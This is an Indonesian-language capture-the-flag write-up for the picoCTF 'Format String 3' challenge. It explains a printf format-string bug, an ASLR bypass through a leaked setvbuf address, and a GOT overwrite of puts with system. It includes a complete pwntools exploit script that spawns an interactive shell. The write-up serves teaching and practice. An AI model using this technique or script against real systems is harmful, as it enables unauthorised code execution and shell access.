# Write-Up: picoCTF - Format String 3

## 1. Informasi Tantangan

* **Kategori:** Pwn / Binary Exploitation
* **Target:** Mengeksploitasi kerentanan *Format String* untuk mendapatkan *shell* (Remote Code Execution) dan membaca *flag*.
* **File yang Disediakan:** *Binary* utama (`vuln`), *source code* (`vuln.c`), *library standard* (`libc.so.6`), dan *linker/interpreter* (`ld-linux-x86-64.so.2`).

## 2. Analisis Kerentanan (Vulnerability Analysis)

Dari inspeksi *source code*, terdapat beberapa poin krusial yang mendasari skenario eksploitasi:

1. **Format String Vulnerability:** Program mengambil input dari `stdin` ke dalam variabel `buf`, lalu langsung mencetaknya menggunakan `printf(buf);`. Ketiadaan *format specifier* (seperti `printf("%s", buf);`) memungkinkan kita menginjeksi specifier seperti `%p` untuk membaca memori atau `%n` untuk menulis ke memori.
2. **ASLR Bypass (Information Leak):** Program memberikan kemudahan dengan mencetak alamat *runtime* dari fungsi `setvbuf` melalui pemanggilan `hello()`. Ini merupakan titik jangkar (*anchor*) yang krusial untuk mengalahkan sistem pengacakan alamat memori (ASLR) milik OS.
3. **Variabel Global Target:** Di awal kode, dideklarasikan `char *normal_string = "/bin/sh";`. Di akhir eksekusi, program memanggil `puts(normal_string);`.

Tujuannya sangat jelas: Kita harus membajak alur pemanggilan `puts` agar berubah menjadi pemanggilan `system`, sehingga argumen `"/bin/sh"` akan membuka akses *shell*.

## 3. Strategi Eksploitasi: GOT Overwrite

Karena kita disertakan file `libc` dan `ld`, lingkungan server dipastikan menggunakan metode *Dynamic Linking*. Kita akan melakukan serangan *Global Offset Table (GOT) Overwrite*.

* **Langkah 1: Menemukan Libc Base Address**
Karena posisi *library* selalu diacak, kita membutuhkan titik nol (*Base Address*).
`Libc Base = Alamat Leak setvbuf (Runtime) - Offset setvbuf (di libc lokal)`
* **Langkah 2: Menghitung Alamat Fungsi `system**`
Setelah titik nol ditemukan, lokasi pasti dari fungsi eksekusi target dapat dikalkulasi.
`Alamat system = Libc Base + Offset system (di libc lokal)`
* **Langkah 3: Menemukan Offset Input pada Stack**
Untuk mengarahkan `%n` ke alamat yang tepat, kita perlu mengetahui di argumen ke-berapa letak variabel `buf` milik `main` terbaca oleh `printf`. Dengan mengirimkan *payload* analisis `AAAA.%p.%p.%p...`, ditemukan bahwa `0x4141414141414141` mendarat di **argumen ke-38**.
* **Langkah 4: Menimpa Entri GOT**
Kita akan mengarahkan `printf` untuk menuliskan alamat asli dari `system` ke dalam lokasi memori GOT milik `puts`. Skema ini dieksekusi memanfaatkan manipulasi pencetakan karakter dan specifier `%n`. Untuk menghindari komplikasi *Null Terminator* (`\x00`) pada arsitektur 64-bit, alamat GOT ditempatkan di akhir *payload* dan dieksekusi menggunakan modul `fmtstr_payload` dari `pwntools`.

## 4. Script Eksploitasi (Python / Pwntools)

Berikut adalah *script* eksploitasi penuh untuk memecahkan tantangan ini.

```python
#!/usr/bin/env python3
from pwn import *

# ========================================================
# SETUP ENVIRONMENT
# ========================================================
# Load binary dan libc bawaan dari tantangan
exe = ELF('./vuln')
libc = ELF('./libc.so.6') 
context.binary = exe

# Ganti dengan remote() untuk menembak server PicoCTF
io = process('./vuln') 
# io = remote('rtea.picoctf.net', 12345) 

# ========================================================
# TAHAP 1: INFORMATION DISCLOSURE & CALCULATION
# ========================================================
# Tangkap banner hingga menyentuh leak alamat
io.recvuntil(b"setvbuf in libc: ")

# Ekstrak alamat memori runtime (ubah dari string hex ke integer)
leak_str = io.recvline().strip()
setvbuf_runtime = int(leak_str, 16)
log.info(f"Leak runtime setvbuf didapatkan: {hex(setvbuf_runtime)}")

# Kalkulasi Base Address Libc
libc.address = setvbuf_runtime - libc.symbols['setvbuf']
log.success(f"Libc Base Address berhasil dihitung: {hex(libc.address)}")

# Kalkulasi alamat fungsi target
system_addr = libc.symbols['system']
log.info(f"Target system() berada di: {hex(system_addr)}")

# ========================================================
# TAHAP 2: GOT OVERWRITE
# ========================================================
# Offset letak variabel input (buf) di stack terhadap printf
OFFSET = 38 

# Otomatisasi pembuatan payload: 
# "Tuliskan <system_addr> ke dalam alamat <GOT puts>"
log.info("Merakit payload Format String...")
payload = fmtstr_payload(OFFSET, {exe.got['puts']: system_addr})

# Kirim eksploit
io.sendline(payload)

# ========================================================
# TAHAP 3: PROFIT
# ========================================================
log.success("Payload terkirim! Menunggu eksekusi puts('/bin/sh')...")
io.interactive()

```

## 5. Kesimpulan Eksekusi

Saat eksekusi, *payload* akan memaksa `printf` membanjiri layar dengan *padding* yang dikonversi menjadi alamat fungsi `system`, lalu `%n` menuliskannya ke entri `puts` di dalam tabel GOT. Pada baris kode selanjutnya, saat program memanggil `puts(normal_string)`, instruksi akan dibelokkan menuju `system("/bin/sh")`, memberikan peretas akses kontrol penuh (Interactive Shell) terhadap server untuk membaca *flag*.
